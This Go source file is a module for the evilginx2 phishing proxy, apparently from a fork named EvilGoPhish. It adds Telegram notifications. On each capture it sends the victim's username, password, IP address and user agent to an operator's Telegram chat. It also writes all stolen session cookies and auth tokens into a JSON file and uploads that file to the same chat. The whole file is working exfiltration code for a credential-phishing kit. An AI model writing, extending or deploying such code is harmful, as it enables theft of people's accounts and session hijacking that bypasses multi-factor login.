package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// TelegramMessage represents a text message to be sent to Telegram
type TelegramMessage struct {
	ChatID    string `json:"chat_id"`
	Text      string `json:"text"`
	ParseMode string `json:"parse_mode"`
}

// TelegramNotifier handles sending notifications to Telegram
type TelegramNotifier struct {
	botToken string
	chatID   string
	enabled  bool
}

// NewTelegramNotifier creates a new Telegram notifier from webhook string
// Format: bot_token/chat_id
func NewTelegramNotifier(webhook string) *TelegramNotifier {
	if webhook == "" {
		return &TelegramNotifier{enabled: false}
	}

	parts := strings.Split(webhook, "/")
	if len(parts) != 2 {
		log.Error("Invalid Telegram webhook format. Expected: bot_token/chat_id")
		return &TelegramNotifier{enabled: false}
	}

	return &TelegramNotifier{
		botToken: parts[0],
		chatID:   parts[1],
		enabled:  true,
	}
}

// IsEnabled returns whether Telegram notifications are enabled
func (tn *TelegramNotifier) IsEnabled() bool {
	return tn.enabled
}

// SendMessage sends a text message to the configured Telegram chat
func (tn *TelegramNotifier) SendMessage(message string) error {
	if !tn.enabled {
		return nil
	}

	telegramAPI := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", tn.botToken)

	payload := TelegramMessage{
		ChatID:    tn.chatID,
		Text:      message,
		ParseMode: "Markdown",
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("failed to marshal message: %v", err)
	}

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Post(telegramAPI, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to send message: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("telegram API returned status %d: %s", resp.StatusCode, string(body))
	}

	return nil
}

// SendFile sends a file to the configured Telegram chat
func (tn *TelegramNotifier) SendFile(filePath string, caption string) error {
	if !tn.enabled {
		return nil
	}

	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("failed to open file: %v", err)
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Add chat_id
	writer.WriteField("chat_id", tn.chatID)

	// Add caption if provided
	if caption != "" {
		writer.WriteField("caption", caption)
	}

	// Add file
	part, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return fmt.Errorf("failed to create form file: %v", err)
	}

	_, err = io.Copy(part, file)
	if err != nil {
		return fmt.Errorf("failed to copy file: %v", err)
	}

	err = writer.Close()
	if err != nil {
		return fmt.Errorf("failed to close writer: %v", err)
	}

	telegramAPI := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", tn.botToken)

	client := &http.Client{Timeout: 30 * time.Second}
	req, err := http.NewRequest("POST", telegramAPI, body)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send file: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("telegram API returned status %d: %s", resp.StatusCode, string(respBody))
	}

	return nil
}

// NotifyCredentialCapture sends a notification when credentials are captured
func (tn *TelegramNotifier) NotifyCredentialCapture(session *Session, phishletName string) error {
	if !tn.enabled {
		return nil
	}

	// Build notification message with exact format requested
	message := "🎣 *New Credentials Captured*\n\n"
	message += fmt.Sprintf("*Phishlet:* %s\n", phishletName)
	message += fmt.Sprintf("*Session ID:* %s\n", session.Id)
	message += fmt.Sprintf("*Time:* %s\n\n", time.Now().UTC().Format("2006-01-02 15:04:05 UTC"))

	if session.Username != "" {
		message += fmt.Sprintf("*Username:* %s\n", session.Username)
	}

	if session.Password != "" {
		message += fmt.Sprintf("*Password:* %s\n", session.Password)
	}

	// Add lure information if available
	if session.PhishLure != nil {
		message += fmt.Sprintf("\n*Lure ID:* %s\n", session.PhishLure.Id)
		if session.PhishLure.Info != "" {
			message += fmt.Sprintf("*Lure Info:* %s\n", session.PhishLure.Info)
		}
	}

	// Add browser information with IP address
	message += "\n*Browser Info:*\n"

	// Add User-Agent from Browser map if available
	if userAgent, ok := session.Browser["user-agent"]; ok && userAgent != "" {
		displayUA := userAgent
		if len(displayUA) > 80 {
			displayUA = displayUA[:80] + "..."
		}
		message += fmt.Sprintf("  • User-Agent: %s\n", displayUA)
	}

	// Add IP address from Browser map if available
	if ipAddr, ok := session.Browser["ip"]; ok && ipAddr != "" {
		message += fmt.Sprintf("  • IP: %s\n", ipAddr)
	}

	// Add custom fields if any
	if len(session.Custom) > 0 {
		message += "\n*Custom Fields:*\n"
		for key, value := range session.Custom {
			message += fmt.Sprintf("  • %s: %s\n", key, value)
		}
	}

	// Count cookies - these are uniquely tied to this specific session
	cookieCount := 0
	for _, domainCookies := range session.CookieTokens {
		cookieCount += len(domainCookies)
	}

	if cookieCount > 0 {
		message += fmt.Sprintf("\n*Session Cookies:* %d captured\n", cookieCount)
		message += "_Cookie file will be sent separately_\n"
	}

	// Send the message
	err := tn.SendMessage(message)
	if err != nil {
		log.Error("Failed to send Telegram notification: %v", err)
		return err
	}

	log.Success("Telegram notification sent successfully")

	// Create and send cookie file if cookies exist
	// This file is uniquely tied to this specific username/password capture
	if cookieCount > 0 {
		cookieFilePath, err := tn.createCookieFile(session, phishletName)
		if err != nil {
			log.Error("Failed to create cookie file: %v", err)
			return err
		}
		defer os.Remove(cookieFilePath) // Clean up after sending

		// Caption includes username to clearly identify which user these cookies belong to
		caption := fmt.Sprintf("🍪 Cookies for %s (%s)", session.Username, phishletName)
		err = tn.SendFile(cookieFilePath, caption)
		if err != nil {
			log.Error("Failed to send cookie file: %v", err)
			return err
		}

		log.Success("Cookie file sent to Telegram successfully")
	}

	return nil
}

// createCookieFile creates a JSON file containing all session cookies
func (tn *TelegramNotifier) createCookieFile(session *Session, phishletName string) (string, error) {
	// Prepare cookie data structure
	type CookieExport struct {
		SessionID  string                                      `json:"session_id"`
		Phishlet   string                                      `json:"phishlet"`
		Username   string                                      `json:"username"`
		Timestamp  string                                      `json:"timestamp"`
		Cookies    map[string]map[string]*database.CookieToken `json:"cookies"`
		BodyTokens map[string]string                           `json:"body_tokens,omitempty"`
		HttpTokens map[string]string                           `json:"http_tokens,omitempty"`
	}

	cookieData := CookieExport{
		SessionID:  session.Id,
		Phishlet:   phishletName,
		Username:   session.Username,
		Timestamp:  time.Now().UTC().Format(time.RFC3339),
		Cookies:    session.CookieTokens,
		BodyTokens: session.BodyTokens,
		HttpTokens: session.HttpTokens,
	}

	// Marshal to JSON with indentation
	jsonData, err := json.MarshalIndent(cookieData, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal cookie data: %v", err)
	}

	// Create temporary file
	tmpDir := os.TempDir()
	fileName := fmt.Sprintf("cookies_%s_%s_%d.json",
		phishletName,
		session.Id[:8],
		time.Now().Unix())
	filePath := filepath.Join(tmpDir, fileName)

	err = os.WriteFile(filePath, jsonData, 0600)
	if err != nil {
		return "", fmt.Errorf("failed to write cookie file: %v", err)
	}

	return filePath, nil
}

// SendTestNotification sends a test notification to verify configuration
func (tn *TelegramNotifier) SendTestNotification() error {
	if !tn.enabled {
		return fmt.Errorf("Telegram notifications are not enabled")
	}

	message := "✅ *Telegram Integration Test*\n\n"
	message += "This is a test notification from EvilGoPhish.\n"
	message += fmt.Sprintf("*Time:* %s\n", time.Now().UTC().Format("2006-01-02 15:04:05 UTC"))
	message += "\nIf you see this message, Telegram notifications are working correctly!"

	return tn.SendMessage(message)
}
